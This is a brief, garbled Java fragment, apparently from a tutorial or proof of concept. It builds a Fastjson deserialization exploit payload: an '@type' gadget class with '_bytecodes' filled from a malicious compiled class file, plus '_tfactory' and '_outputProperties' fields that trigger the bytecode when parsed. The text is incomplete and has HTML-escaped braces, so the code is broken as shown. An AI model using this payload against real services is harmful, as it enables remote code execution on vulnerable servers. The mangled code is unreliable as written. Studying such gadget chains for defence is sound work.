final String evilClassPath = "E:\\JavaClass\\TemplatesBytes.class";

"

&#123;

 \"@type\":\"" + NASTY_CLASS + "\",
 \"_bytecodes\":[\""+evilCode+"\"],
 '_name':'Drunkbaby',
 '_tfactory':&#123; &#125;,
 \"_outputProperties\":&#123; &#125;,

";

